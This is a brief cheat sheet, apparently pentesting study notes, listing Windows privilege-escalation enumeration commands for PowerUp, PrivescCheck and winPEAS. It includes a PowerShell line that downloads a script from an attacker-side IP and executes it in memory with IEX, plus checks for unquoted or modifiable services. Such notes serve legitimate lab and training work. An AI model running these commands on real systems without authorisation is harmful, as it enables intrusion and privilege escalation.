### PowerUp
```powershell
Import-Module .\PowerUp.ps1
IEX(New-Object Net.WebClient).downloadString('http://192.168.45.x/PowerUp.ps1')
```

```powershell
Invoke-AllChecks
Get-ServiceUnquoted -Verbose
Get-ModifiableServiceFile -Verbose
Get-ModifiableService -Verbose
```

### Privesc
```powershell
Import-Module .\PrivEscCheck.ps1
```

```powershell
Invoke-PrivEscCheck
```

### PEASS-ng
```powershell
.\winPEASx64.exe
```